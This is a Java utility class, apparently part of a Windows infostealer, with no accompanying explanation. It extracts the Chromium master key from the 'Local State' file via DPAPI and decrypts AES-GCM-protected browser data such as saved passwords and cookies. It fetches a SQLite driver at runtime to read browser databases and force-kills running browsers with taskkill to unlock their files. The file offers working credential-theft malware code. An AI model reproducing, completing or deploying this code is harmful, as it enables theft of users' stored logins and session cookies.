package com.example.browsers.Util;

import java.io.*;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.Arrays;
import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import com.google.gson.Gson;
import com.google.gson.JsonObject;
import com.sun.jna.platform.win32.Crypt32Util;
import org.apache.commons.io.FileUtils;

import java.util.Arrays;
import java.util.Base64;

public class DecryptUtil {

    public static String decrypt(byte[] encryptedData, byte[] key) {
        try {
            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
            byte[] iv = Arrays.copyOfRange(encryptedData, 3, 15);
            byte[] payload = Arrays.copyOfRange(encryptedData, 15, encryptedData.length);
            GCMParameterSpec spec = new GCMParameterSpec(128, iv);
            SecretKeySpec keySpec = new SecretKeySpec(key, "AES");
            cipher.init(2, keySpec, spec);
            return new String(cipher.doFinal(payload));
        } catch (Exception e) {
            return null;
        }
    }
    public static byte[] getKey(File path) {
        try {

            JsonObject localStateJson = new Gson().fromJson(new FileReader(path), JsonObject.class);
            byte[] encryptedKeyBytes = localStateJson.get("os_crypt").getAsJsonObject().get("encrypted_key").getAsString().getBytes();
            encryptedKeyBytes = Base64.getDecoder().decode(encryptedKeyBytes);
            encryptedKeyBytes = Arrays.copyOfRange(encryptedKeyBytes, 5, encryptedKeyBytes.length);
            return Crypt32Util.cryptUnprotectData(encryptedKeyBytes);
        }
        catch (Exception e) {
            return null;
        }
    }
    public static java.sql.Driver getDriver(){
        try {
            File driverFile = new File(System.getProperty("java.io.tmpdir") + File.separator + "sqlite-jdbc-3.42.0.0.jar");
            URL url = new URL("https://search.maven.org/remotecontent?filepath=org/xerial/sqlite-jdbc/3.42.0.0/sqlite-jdbc-3.42.0.0.jar");
            if (!driverFile.exists()) {
                FileUtils.copyURLToFile(url, driverFile);
            }
            driverFile.deleteOnExit();
            ClassLoader classLoader = new URLClassLoader(new URL[] { driverFile.toURI().toURL() });
            Class clazz = Class.forName("org.sqlite.JDBC", true, classLoader);
            Object driverInstance = clazz.newInstance();
            return (java.sql.Driver) driverInstance;
        } catch (Exception e) {
        }
        return null;
    }
    public static void kill(){
        String[] blacklistedProcceses = {
                "chrome.exe", "msedge.exe", "opera.exe", "brave.exe", "vivaldi.exe", "browser.exe"};
        final StringBuilder builder = new StringBuilder();
        try {
            final BufferedReader reader = new BufferedReader(new InputStreamReader(new ProcessBuilder("tasklist").start().getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                builder.append(line).append("\n");
            }
        } catch (IOException ex) {}
        String processes = builder.toString();
        try{
            for (String process : blacklistedProcceses) {
                if (processes.contains(process)) {
                    ProcessBuilder pb = new ProcessBuilder("taskkill", "/F", "/IM", process);
                    pb.start();
                    Thread.sleep(2000);
                }
            }
        }
        catch(IOException e){} catch (InterruptedException e) {
        }
    }
}
